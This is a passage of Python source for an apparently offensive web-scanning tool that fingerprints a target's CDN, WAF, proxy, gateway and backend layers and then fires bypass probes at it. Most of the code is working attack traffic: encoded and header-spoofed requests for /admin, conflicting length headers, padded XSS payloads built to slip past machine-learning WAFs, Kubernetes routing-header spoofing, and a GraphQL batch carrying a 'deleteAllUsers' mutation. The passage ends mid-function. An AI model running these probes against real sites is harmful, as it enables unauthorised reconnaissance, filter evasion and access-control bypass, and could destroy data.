                'apache': ['server.*apache', 'x-apache'],
                'haproxy': ['server.*haproxy'],
                'traefik': ['server.*traefik'],
                'envoy': ['server.*envoy', 'x-envoy'],
                'istio': ['server.*istio'],
                'linkerd': ['l5d-'],
                'aws-alb': ['awsalb', 'elbv2'],
                'gcp-lb': ['via.*google frontend'],
                # EXTENDED PROXY SIGNATURES
                'caddy': ['server.*caddy'],
                'lighttpd': ['server.*lighttpd'],
                'varnish': ['via.*varnish', 'x-varnish'],
                'squid': ['via.*squid', 'x-squid'],
                'cloudfront': ['via.*cloudfront'],
                'azure-frontdoor': ['x-azure-fdid'],
                'kong': ['via.*kong', 'x-kong-'],
                'ambassador': ['x-envoy-upstream-service-time'],
                'ingress-nginx': ['server.*nginx-ingress']
            }

            detected_proxy = None
            for proxy, indicators in proxy_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_proxy = proxy
                            break
                if detected_proxy:
                    break

            if detected_proxy:
                self.log_discovery("Proxy", "Detection", detected_proxy)
                self.chain_map['layers'].append(f"Proxy-{detected_proxy}")
            else:
                self.log_discovery("Proxy", "Detection", "None detected or unknown")

        except Exception as e:
            self.log_discovery("Proxy", "Error", str(e))

    def backend_fingerprinting_extended(self, backend_paths):
        """Fingerprint backend application server - EXTENDED VERSION"""
        print("  🖥️  Backend Detection...")

        # Your original signatures + EXTENSIONS
        backend_signatures = {
            'apache': ['server.*apache'],
            'nginx': ['server.*nginx'],
            'iis': ['server.*iis', 'x-aspnet-version'],
            'tomcat': ['server.*tomcat'],
            'jetty': ['server.*jetty'],
            'node': ['x-powered-by.*express', 'x-powered-by.*node'],
            'php': ['x-powered-by.*php', 'server.*php'],
            'python': ['server.*gunicorn', 'server.*uwsgi'],
            'ruby': ['server.*puma', 'x-powered-by.*ruby'],
            'go': ['server.*go'],
            # EXTENDED BACKEND SIGNATURES
            'undertow': ['server.*undertow'],
            'kestrel': ['server.*kestrel'],
            'uvicorn': ['server.*uvicorn'],
            'hypercorn': ['server.*hypercorn'],
            'daphne': ['server.*daphne'],
            'cherrypy': ['server.*cherrypy'],
            'tornado': ['server.*tornado'],
            'waitress': ['server.*waitress'],
            'actix': ['server.*actix'],
            'warp': ['server.*warp'],
            'rocket': ['server.*rocket']
        }

        detected_backend = None

        # Your original test logic (PRESERVED)
        for path in backend_paths['paths']:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)

                full_response = f"{response.headers} {response.text}".lower()

                for backend, signatures in backend_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_backend = backend
                            break
                    if detected_backend:
                        break

                if detected_backend:
                    break

            except Exception as e:
                continue

        # EXTENDED: Additional backend detection via error pages
        if not detected_backend:
            try:
                error_response = self.session.get(f"{self.target_url}/nonexistent-page-404", timeout=5)
                error_text = error_response.text.lower()
                
                if 'apache' in error_text and 'server at' in error_text:
                    detected_backend = 'apache'
                elif 'nginx' in error_text:
                    detected_backend = 'nginx'
                elif 'iis' in error_text or 'internet information services' in error_text:
                    detected_backend = 'iis'
                    
            except Exception:
                pass

        if detected_backend:
            self.log_discovery("Backend", "Detection", detected_backend)
            self.chain_map['layers'].append(f"Backend-{detected_backend}")
        # else:
        #     self.log_discovery("Backend", "Detection", "None detected or unknown")

    # NEW FUNCTIONS (keeping the ones I provided earlier)
    def load_balancer_fingerprinting(self, lb_config):
        """Detect load balancers"""
        print("  ⚔️  Load Balancer Detection...")
        try:
            response = self.session.get(self.target_url, headers=lb_config['headers'])
            
            lb_signatures = lb_config['lb_signatures']
            for lb_type, signatures in lb_signatures.items():
                for signature in signatures:
                    for header, value in response.headers.items():
                        if signature.lower() in f"{header}: {value}".lower():
                            self.log_discovery("LoadBalancer", "Detection", f"{lb_type}")
                            self.chain_map['layers'].append(f"LB-{lb_type}")
                            return
                        else:
                            self.log_discovery("LoadBalancer", "Detection", "None detected or unknown")    
            # Test health check endpoints
            for health_check in lb_config['lb_tests']['health_checks']:
                try:
                    response = self.session.get(f"{self.target_url}{health_check}", timeout=3)
                    if response.status_code == 200:
                        self.log_discovery("LoadBalancer", "HealthCheck", health_check)
                        break
                except:
                    continue
                    
        except Exception as e:
            self.log_discovery("LoadBalancer", "Error", str(e))

    def api_gateway_fingerprinting(self, gw_config):
        """Detect API gateways"""
        print("  📝 API Gateways Detection...")
        try:
            response = self.session.get(self.target_url, headers=gw_config['headers'])
            
            gw_signatures = gw_config['gateway_signatures']
            for gw_type, signatures in gw_signatures.items():
                for signature in signatures:
                    for header, value in response.headers.items():
                        if signature.lower() in f"{header}: {value}".lower():
                            self.log_discovery("APIGateway", "Detection", f"{gw_type}")
                            self.chain_map['layers'].append(f"GW-{gw_type}")
                            return
                        # else:
                        #     self.log_discovery("APIGateway", "Detection", "None detected or unknown")      
        except Exception as e:
            self.log_discovery("APIGateway", "Error", str(e))

    def service_mesh_fingerprinting(self, mesh_config):
        """Detect service mesh components"""
        print("  🕵️‍♂️  Service Mesh  Detection...")
        try:
            response = self.session.get(self.target_url, headers=mesh_config['headers'])
            
            mesh_signatures = mesh_config['mesh_signatures']
            for mesh_type, signatures in mesh_signatures.items():
                for signature in signatures:
                    for header, value in response.headers.items():
                        if signature.lower() in f"{header}: {value}".lower():
                            self.log_discovery("ServiceMesh", "Detection", f"{mesh_type}")
                            self.chain_map['layers'].append(f"MESH-{mesh_type}")
                            return
                        # else:
                        #     self.log_discovery("ServiceMesh", "Detection", "None detected or unknown")      
        except Exception as e:
            self.log_discovery("ServiceMesh", "Error", str(e))

    def container_fingerprinting(self, container_config):
        """Detect container orchestration platforms"""
        print("  🔓  Container Orchestration Detection...")
        try:
            # Test Kubernetes endpoints
            k8s_tests = container_config['container_tests']['kubernetes']['endpoints']
            for k8s_test in k8s_tests:
                try:
                    response = self.session.get(f"{self.target_url}{k8s_test}", timeout=3)
                    if response.status_code in [200, 401, 403]:
                        self.log_discovery("Container", "Kubernetes", k8s_test)
                        self.chain_map['layers'].append("K8S")
                        return
                    else:
                        self.log_discovery("Container", "Detection", "None detected or unknown")   
                except:
                    continue
                    
        except Exception as e:
            self.log_discovery("Container", "Error", str(e))

    def runtime_fingerprinting(self, runtime_config):
        """Detect application runtime environments with strict validation"""
        print("  🐾 Application Runtime  Detection...")
        try:
            framework_tests = runtime_config['runtime_tests']['framework_detection']
            for framework, tests in framework_tests.items():
                score = 0
                for test in tests:
                    try:
                        url = f"{self.target_url}{test}"
                        response = self.session.get(url, timeout=3)

                        # Base status code check
                        if response.status_code in [200, 401, 403]:
                            score += 1  # path exists and accessible

                            body = response.text.lower()
                            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
                            
                            # Check for keywords in response body
                            keyword_hits = 0
                            if framework.lower() in body:
                                keyword_hits += 1
                            for keyword in ['framework', 'spring', 'django', 'express', 'runtime', 'node.js', 'flask', 'fastapi', 'dotnet', 'laravel']:
                                if keyword in body:
                                    keyword_hits += 1

                            # Check headers
                            header_hits = 0
                            for header in ['x-powered-by', 'server', 'x-runtime']:
                                if header in headers and framework.lower() in headers[header]:
                                    header_hits += 1

                            # Avoid false positives: body too generic?
                            generic_bodies = ['ok', 'healthy', 'up', '', '{}']
                            if body.strip() in generic_bodies:
                                continue  # skip this test as too vague

                            score += keyword_hits + header_hits

                            if score >= 4:
                                self.log_discovery("Runtime", "Framework", f"{framework}")
                                self.chain_map['layers'].append(f"FW-{framework.upper()}")
                                break  # Found with confidence
                            # else:
                            #     self.log_discovery("Runtime", "Detection", "None detected or unknown")   

                    except Exception:
                        continue

        except Exception as e:
            self.log_discovery("Runtime", "Error", str(e))



    def database_fingerprinting(self, db_config):
        """Detect database and storage systems"""
        print("  ⚙️  Database and Storage Detection...")
        try:
            # Test admin interfaces
            if 'admin_interfaces' in db_config['db_tests']:
                admin_tests = db_config['db_tests']['admin_interfaces']
                for interface, tests in admin_tests.items():
                    for test in tests:
                        try:
                            response = self.session.get(f"{self.target_url}{test}", timeout=3)
                            if response.status_code in [200, 401, 403]:
                                self.log_discovery("Database", "Admin", f"{interface}")
                                self.chain_map['layers'].append(f"DB-ADMIN-{interface.upper()}")
                                break
                            else:
                                self.log_discovery("Database", "Detection", "None detected or unknown")   
                        except:
                            continue
                            
        except Exception as e:
            self.log_discovery("Database", "Error", str(e))

    def serverless_fingerprinting(self, serverless_config):
        """Detect serverless/function platforms"""
        print("  💻  Serverless Detection...")
        try:
            response = self.session.get(self.target_url, headers=serverless_config['headers'])
            
            serverless_signatures = serverless_config['serverless_signatures']
            for platform, signatures in serverless_signatures.items():
                for signature in signatures:
                    for header, value in response.headers.items():
                        if signature.lower() in f"{header}: {value}".lower():
                            self.log_discovery("Serverless", "Platform", f"{platform}")
                            self.chain_map['layers'].append(f"SERVERLESS-{platform.upper()}")
                            return
                        # else:
                        #     self.log_discovery("Serverless", "Detection", "None detected or unknown")   
                            
        except Exception as e:
            self.log_discovery("Serverless", "Error", str(e))
        
    async def protocol_discovery(self):
        """Discover supported protocols"""
        print("\n🔍 Phase 1: Protocol Discovery")
        
        # HTTP/2 Detection
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url) as response:
                    if hasattr(response, 'version') and response.version.major >= 2:
                        self.protocols['http2'] = True
                        self.log_discovery("Protocol", "HTTP/2", "Supported")
        except:
            pass
        
        # HTTP/3 Detection (via Alt-Svc header)
        try:
            response = self.session.head(self.target_url)
            alt_svc = response.headers.get('Alt-Svc', '')
            if 'h3' in alt_svc or 'h3-29' in alt_svc:
                self.protocols['http3'] = True
                self.log_discovery("Protocol", "HTTP/3", f"Detected via Alt-Svc: {alt_svc}")
        except:
            pass
        
        # WebSocket Detection
        try:
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            response = self.session.get(self.target_url, headers=ws_headers)
            if response.status_code == 101:
                self.protocols['websocket'] = True
                self.log_discovery("Protocol", "WebSocket", "Upgrade supported")
        except:
            pass

    def infrastructure_fingerprinting(self):
        """Fingerprint complete infrastructure stack - All 10+ Layers"""
        print("\n🔍 Phase 2: Complete Infrastructure Fingerprinting")
        fingerprints = self.create_fingerprint_payloads()
        
        # Layer 1: CDN Detection (Extended)
        print("  🌐 Layer 1: CDN Detection")
        try:
            response = self.session.get(self.target_url, headers=fingerprints['cdn_detection']['headers'])
            # Analyze response headers for CDN signatures (EXTENDED)
            cdn_indicators = {
                'cloudflare': ['cf-ray', 'cf-cache-status', 'server.*cloudflare'],
                'cloudfront': ['x-amz-cf', 'x-cache.*cloudfront'],
                'fastly': ['fastly-debug', 'x-served-by.*fastly'],
                'akamai': ['akamai-origin-hop', 'x-akamai'],
                'incapsula': ['x-iinfo', 'incap_ses'],
                'sucuri': ['x-sucuri', 'server.*sucuri'],
                'maxcdn': ['x-cache.*maxcdn'],
                'keycdn': ['server.*keycdn'],
                'bunnycdn': ['server.*bunnycdn'],
                'jsdelivr': ['x-served-by.*jsdelivr'],
                'unpkg': ['x-served-by.*unpkg']
            }
            detected_cdn = None
            for cdn, indicators in cdn_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_cdn = cdn
                            break
                    if detected_cdn:
                        break
            if detected_cdn:
                self.log_discovery("CDN", "Detection", detected_cdn)
                self.chain_map['layers'].append(f"CDN-{detected_cdn}")
            else:
                self.log_discovery("CDN", "Detection", "None detected or unknown")  
        
        except Exception as e:
            self.log_discovery("CDN", "Error", str(e))

        # Layer 2: WAF Detection (Using your existing function - EXTENDED)
        print("  📡 Layer 2: WAF Detection")
        self.waf_fingerprinting_extended(fingerprints['waf_detection'])
        
        # Layer 3: Load Balancer Detection (NEW)
        print("  📡 Layer 3: Load Balancer Detection")
        self.load_balancer_fingerprinting(fingerprints['load_balancer_detection'])
        
        # Layer 4: Proxy Detection (Using your existing function - EXTENDED)
        print("  📡 Layer 4: Proxy Detection")
        self.proxy_fingerprinting_extended(fingerprints['proxy_detection'])
        
        # Layer 5: API Gateway Detection (NEW)
        print("  📡 Layer 5: API Gateway Detection")
        self.api_gateway_fingerprinting(fingerprints['api_gateway_detection'])
        
        # Layer 6: Service Mesh Detection (NEW)
        print("  📡 Layer 6: Service Mesh Detection")
        self.service_mesh_fingerprinting(fingerprints['service_mesh_detection'])
        
        # Layer 7: Container Detection (NEW)
        print("  📡 Layer 7: Container Orchestration Detection")
        self.container_fingerprinting(fingerprints['container_detection'])
        
        # Layer 8: Runtime Detection (NEW)
        print("  📡 Layer 8: Application Runtime Detection")
        self.runtime_fingerprinting(fingerprints['runtime_detection'])
        
        # Layer 9: Database Detection (NEW)
        print("  📡 Layer 9: Database/Storage Detection")
        self.database_fingerprinting(fingerprints['database_detection'])
        
        # Layer 10: Serverless Detection (NEW)
        print("  📡 Layer 10: Serverless/Function Detection")
        self.serverless_fingerprinting(fingerprints['serverless_detection'])
        
        # Layer 11: Backend Detection (Using your existing function - EXTENDED)
        print("  📡 Layer 11: Backend Detection")
        self.backend_fingerprinting_extended(fingerprints['backend_detection'])


    def _detect_stack_type(self, endpoint: str) -> Optional[str]:
        """Detect the stack type for a given endpoint"""
        response = self.session.head(endpoint)
        headers = response.headers
        
        if any(h in headers for h in ['cf-ray', 'cf-cache-status']):
            return 'cloudflare_nginx'
        elif any(h in headers for h in ['x-amzn-trace-id']):
            return 'aws_waf_apache'
        
        return None


    def parser_discrepancy_testing(self):
        """Test for parsing discrepancies between layers"""
        print("\n🔍 Phase 3: Parser Discrepancy Analysis")
        
        # Original tests
        discrepancy_tests = [
            self.test_http_smuggling,
            self.test_unicode_confusion,
            self.test_encoding_discrepancies,
            self.test_header_confusion,
            self.test_method_confusion,
            self.test_path_normalization,
            self.test_parameter_pollution,
            self.test_tcp_fragmentation,
            self.test_compression_bomb,
            self.test_timing_race_conditions,
            # New advanced tests
            self.test_parser_state_confusion,
            self.test_buffer_boundary_discrepancies,
            self.test_nested_encoding_confusion,
            self.test_protocol_tunneling_discrepancies,
            self.test_cache_key_confusion,
            self.test_parser_backtracking_dos,
            self.test_integer_overflow_length,
            self.test_toctou_race_conditions,
            self.test_quic_http3_confusion,
            self.test_ml_waf_evasion,
            self.test_container_orchestration_bypass,
            self.test_graphql_rest_confusion
        ]
        
        for test in discrepancy_tests:
            try:
                test()
            except Exception as e:
                print(f"  ❌ Error in {test.__name__}: {str(e)}")

    # Advanced Discrepancy Tests
    def test_parser_state_confusion(self):
        """Test parser state machine desynchronization"""
        print("  🔄 Testing Parser State Machine Confusion...")
        
        # HTTP/2 Pseudo-Header Injection
        try:
            headers = {
                ':method': 'GET',
                ':path': '/admin',
                ':authority': 'internal.backend',
                ':scheme': 'https',
                'x-override-method': 'POST'
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code != 400:  # Should fail with pseudo-headers in HTTP/1.1
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'H2 Pseudo-Header Injection',
                    'description': 'HTTP/2 pseudo-headers accepted in HTTP/1.1 context',
                    'headers': headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "H2 pseudo-header confusion")
        except:
            pass
        
        # WebSocket Upgrade State Confusion
        try:
            # Step 1: Start WebSocket upgrade
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            
            # Send partial upgrade
            response1 = self.session.get(self.target_url, headers=ws_headers, timeout=2)
            
            # Step 2: Send normal request immediately after
            # Use discovered forbidden endpoint if available
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            response2 = self.session.get(test_endpoint, timeout=2)
            
            if response2.status_code == 200:
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'WebSocket State Leak',
                    'description': 'Parser state leaked between WebSocket and HTTP',
                    'evidence': 'Admin path accessible after WebSocket attempt'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "WebSocket state leak")
        except:
            pass

    def test_buffer_boundary_discrepancies(self):
        """Test buffer boundary confusion"""
        print("  📊 Testing Buffer Boundary Discrepancies...")
        
        # Header Buffer Boundary Test
        try:
            # Test 8KB boundary
            large_header_value = 'A' * 8192
            headers = {
                'X-Large-Header': large_header_value[:8000],
                'X-Secret': 'admin'  # This might get processed differently
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code in [200, 413, 431]:
                discrepancy = {
                    'type': 'Buffer Boundary',
                    'subtype': 'Header Buffer Overflow',
                    'description': 'Headers at 8KB boundary processed differently',
                    'buffer_size': 8192,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Buffer Boundary", "8KB header boundary")
        except:
            pass
        
        # URL Length Boundary Test
        try:
            # Test 2KB vs 8KB URL limits
            for size in [2048, 4096, 8192]:
                long_path = '/' + 'A' * (size - 20) + '/../admin'
                response = self.session.get(f"{self.target_url}{long_path}", timeout=5)
                
                if response.status_code != 414:
                    discrepancy = {
                        'type': 'Buffer Boundary',
                        'subtype': 'URL Length Limit',
                        'description': f'URL accepted at {size} bytes',
                        'buffer_size': size,  # Changed from 'url_length' to 'buffer_size' for consistency
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Buffer Boundary", f"{size} byte URL accepted")
        except:
            pass

    def test_nested_encoding_confusion(self):
        """Test nested encoding state stack confusion"""
        print("  🔢 Testing Nested Encoding Confusion...")
        
        # Mixed UTF-8 and UTF-16 BOM switching
        try:
            # UTF-8 BOM followed by UTF-16 BOM
            payload = b'\xef\xbb\xbf/admin\xff\xfe'
            response = self.session.get(
                self.target_url,
                data=payload,
                headers={'Content-Type': 'text/plain'},
                timeout=5
            )
            
            if response.status_code != 400:
                discrepancy = {
                    'type': 'Nested Encoding',
                    'subtype': 'BOM Switching',
                    'description': 'Mixed BOM encoding accepted',
                    'payload': 'UTF-8 BOM + /admin + UTF-16 BOM',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Encoding", "BOM switching accepted")
        except:
            pass
        
        # Percent-Encoding in Different Bases
        encoding_variations = [
            ('Hex Standard', '/%61dmin'),
            ('Octal', '/%0141dmin'),
            ('Unicode IIS', '/%u0061dmin'),
            ('Double Decimal', '/%%36%31dmin')
        ]
        
        for name, path in encoding_variations:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)
                if response.status_code == 200:
                    discrepancy = {
                        'type': 'Nested Encoding',
                        'subtype': f'{name} Encoding',
                        'description': f'{name} encoding decoded to /admin',
                        'encoded_path': path,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{name} encoding accepted")
            except:
                pass

    def test_protocol_tunneling_discrepancies(self):
        """Test protocol nesting confusion"""
        print("  🔀 Testing Protocol Tunneling Discrepancies...")
        
        # HTTP in HTTP (Absolute URI)
        try:
            response = self.session.request(
                'GET',
                f"{self.target_url}",
                headers={
                    'Host': 'public.site',
                    'X-Original-URL': 'http://internal.backend/admin'
                },
                timeout=5
            )
            
            if 'admin' in response.text.lower() or response.status_code == 200:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Absolute URI Confusion',
                    'description': 'Internal URL accessible via header',
                    'technique': 'X-Original-URL header',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol Tunneling", "Absolute URI confusion")
        except:
            pass
        
        # Multiple Protocol Upgrades
        try:
            headers = {
                'Upgrade': 'websocket, h2c, spdy/3.1',
                'Connection': 'Upgrade'
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code not in [400, 426]:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Multiple Upgrade Confusion',
                    'description': 'Multiple protocol upgrades not rejected',
                    'protocols': 'websocket, h2c, spdy/3.1',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol", "Multiple upgrades accepted")
        except:
            pass

    def test_cache_key_confusion(self):
        """Test cache key computation discrepancies"""
        print("  🔑 Testing Cache Key Confusion...")
        
        # Case Sensitivity Mismatch
        case_variations = [
            ('/ADMIN', 'example.com'),
            ('/admin', 'EXAMPLE.COM'),
            ('/Admin', 'Example.Com')
        ]
        
        responses = {}
        for path, host in case_variations:
            try:
                response = self.session.get(
                    f"{self.target_url}{path}",
                    headers={'Host': host},
                    timeout=5
                )
                key = f"{path}:{host}"
                responses[key] = response.status_code
            except:
                pass
        
        if len(set(responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Case Sensitivity',
                'description': 'Different responses for case variations',
                'responses': responses,
                'unique_codes': len(set(responses.values()))
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", f"Case sensitivity: {len(set(responses.values()))} different responses")
        
        # Parameter Order Confusion
        param_variations = [
            '/?b=2&a=1',
            '/?a=1&b=2',
            '/?a=1&b=2&',
            '/?a=1&amp;b=2'
        ]
        
        param_responses = {}
        for params in param_variations:
            try:
                response = self.session.get(f"{self.target_url}{params}", timeout=5)
                param_responses[params] = response.status_code
            except:
                pass
        
        if len(set(param_responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Parameter Order',
                'description': 'Parameter order affects caching',
                'variations': param_responses
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", "Parameter order matters")

    def test_parser_backtracking_dos(self):
        """Test parser algorithmic complexity"""
        print("  ⏱️ Testing Parser Backtracking...")
        
        # Nested Parameter Parsing Complexity
        try:
            # Create deeply nested parameters
            nested_params = []
            for i in range(5):
                for j in range(5):
                    for k in range(5):
                        nested_params.append(f'p[{i}][{j}][{k}]=v')
            
            complex_query = '&'.join(nested_params)
            
            start_time = time.time()
            response = self.session.get(
                f"{self.target_url}/?{complex_query}",
                timeout=10
            )
            elapsed = time.time() - start_time
            
            if elapsed > 2:  # Slow processing indicates complexity issue
                discrepancy = {
                    'type': 'Parser Complexity',
                    'subtype': 'Nested Parameter DoS',
                    'description': 'Nested parameters cause slow parsing',
                    'processing_time': elapsed,
                    'complexity': 'O(n³)',
                    'param_count': len(nested_params)
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser DoS", f"Slow parsing: {elapsed:.2f}s")
        except:
            pass

    def test_integer_overflow_length(self):
        """Test integer overflow in length calculations"""
        print("  🔢 Testing Integer Overflow in Lengths...")
        
        overflow_values = [
            ('2^32', '4294967296'),
            ('2^31', '2147483648'),
            ('Negative', '-1'),
            ('Scientific', '1e3'),
            ('Hex', '0x100')
        ]
        
        for name, value in overflow_values:
            try:
                headers = {
                    'Content-Length': value,
                    'Transfer-Encoding': 'chunked'  # Fallback
                }
                
                response = self.session.post(
                    self.target_url,
                    headers=headers,
                    data=b'test',
                    timeout=5
                )
                
                if response.status_code not in [400, 411, 413]:
                    discrepancy = {
                        'type': 'Integer Overflow',
                        'subtype': f'{name} Content-Length',
                        'description': f'Non-standard length value accepted: {value}',
                        'length_value': value,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Integer", f"{name} length: {value}")
            except:
                pass

    def test_toctou_race_conditions(self):
        """Test Time-of-Check vs Time-of-Use race conditions"""
        print("  ⚡ Testing TOCTOU Race Conditions...")
        
        # Skip if no forbidden endpoint found
        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("    ⚠️ Skipping TOCTOU test - no forbidden endpoint available")
            return
        
        try:
            results = []
            
            # Use discovered forbidden endpoint or fallback
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/api/admin"
            
            def race_request(delay):
                time.sleep(delay)
                try:
                    resp = self.session.get(test_endpoint, timeout=3)
                    results.append((delay, resp.status_code))
                except:
                    results.append((delay, 'error'))
            
            # Send requests with micro-delays
            threads = []
            for delay in [0, 0.001, 0.01, 0.05]:
                thread = threading.Thread(target=race_request, args=(delay,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            # Check for timing-dependent differences
            status_codes = [r[1] for r in results if r[1] != 'error']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'TOCTOU Race',
                    'subtype': 'Async Validation',
                    'description': 'Race condition in request validation',
                    'timing_results': results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TOCTOU", f"Race condition detected: {len(set(status_codes))} responses")
        except:
            pass

    def test_quic_http3_confusion(self):
        """Test QUIC/HTTP3 specific discrepancies"""
        print("  🚀 Testing QUIC/HTTP3 Confusion...")
        
        if self.protocols['http3']:
            try:
                # Test Alt-Svc manipulation
                headers = {
                    'Alt-Used': 'evil.com:443',
                    'Alt-Svc': 'h3-29=":443"; ma=86400'
                }
                
                response = self.session.get(self.target_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    discrepancy = {
                        'type': 'QUIC/HTTP3',
                        'subtype': 'Alt-Svc Manipulation',
                        'description': 'Alt-Svc headers accepted and may affect routing',
                        'headers': headers
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "QUIC", "Alt-Svc manipulation possible")
            except:
                pass

    def test_ml_waf_evasion(self):
        """Test ML-based WAF evasion techniques"""
        print("  🤖 Testing ML WAF Evasion...")
        
        # Adversarial Padding
        try:
            benign_tokens = ['user', 'login', 'welcome', 'dashboard', 'profile']
            padding = ' '.join(random.choices(benign_tokens, k=100))
            
            payload = f"{padding} <script>alert(1)</script> {padding}"
            
            response = self.session.get(
                f"{self.target_url}/?q={urllib.parse.quote(payload)}",
                timeout=5
            )
            
            if response.status_code not in [403, 406]:
                discrepancy = {
                    'type': 'ML WAF Evasion',
                    'subtype': 'Adversarial Padding',
                    'description': 'Benign token padding may confuse ML models',
                    'padding_size': len(padding),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "ML Evasion", "Adversarial padding effective")
        except:
            pass
        
        # Context Window Overflow
        try:
            # Create payload that exceeds typical context windows
            pre_context = 'safe content ' * 200  # ~2400 chars
            malicious = '<img src=x onerror=alert(1)>'
            post_context = ' safe content' * 200
            
            full_payload = pre_context + malicious + post_context
            
            response = self.session.post(
                self.target_url,
                data={'content': full_payload},
                timeout=5
            )
            
            if response.status_code not in [403, 406]:
                discrepancy = {
                    'type': 'ML WAF Evasion',
                    'subtype': 'Context Window Overflow',
                    'description': 'Large context may exceed ML model window',
                    'payload_size': len(full_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "ML Evasion", "Context window overflow")
        except:
            pass

    def test_container_orchestration_bypass(self):
        """Test container/orchestration layer bypasses"""
        print("  🐳 Testing Container Orchestration Bypass...")
        
        # Service Mesh Headers
        try:
            # Use discovered forbidden endpoint if available
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            parsed_endpoint = urlparse(test_endpoint)
            test_path = parsed_endpoint.path or '/admin'
            
            k8s_headers = {
                'X-Forwarded-Host': 'admin-service.default.svc.cluster.local',
                'X-Envoy-Decorator-Operation': 'admin-service.admin.svc.cluster.local/*',
                'X-B3-TraceId': ''.join(random.choices('0123456789abcdef', k=32)),
                'X-B3-SpanId': ''.join(random.choices('0123456789abcdef', k=16))
            }
            
            response = self.session.get(
                test_endpoint,
                headers=k8s_headers,
                timeout=5
            )
            
            if response.status_code == 200:
                discrepancy = {
                    'type': 'Container Orchestration',
                    'subtype': 'Service Mesh Headers',
                    'description': 'K8s service mesh headers affect routing',
                    'headers': k8s_headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "K8s", "Service mesh header bypass")
        except:
            pass

    def test_graphql_rest_confusion(self):
        """Test GraphQL-REST gateway confusion"""
        print("  📊 Testing GraphQL-REST Gateway Confusion...")
        
        try:
            # REST to GraphQL Injection
            graphql_in_rest = {
                'path': '/api/users/1;query{admin{password}}',
                'headers': {'Content-Type': 'application/json'}
            }
            
            response = self.session.get(
                f"{self.target_url}{graphql_in_rest['path']}",
                headers=graphql_in_rest['headers'],
                timeout=5
            )
            
            if 'admin' in response.text or 'graphql' in response.text.lower():
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'REST to GraphQL Injection',
                    'description': 'GraphQL query in REST endpoint',
                    'injection_point': 'URL path parameter',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "REST-GraphQL boundary confusion")
        except:
            pass
        
        # GraphQL Batching via REST
        try:
            batch_payload = {
                'query': [
                    'query { user { name } }',
                    'mutation { deleteAllUsers }'
                ]
            }
            
            response = self.session.post(
                f"{self.target_url}/graphql",
                json=batch_payload,
                timeout=5
            )
            
            if response.status_code == 200:
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'Batch Query Injection',
                    'description': 'GraphQL batching accepted via REST',
                    'technique': 'Array of queries'
                }
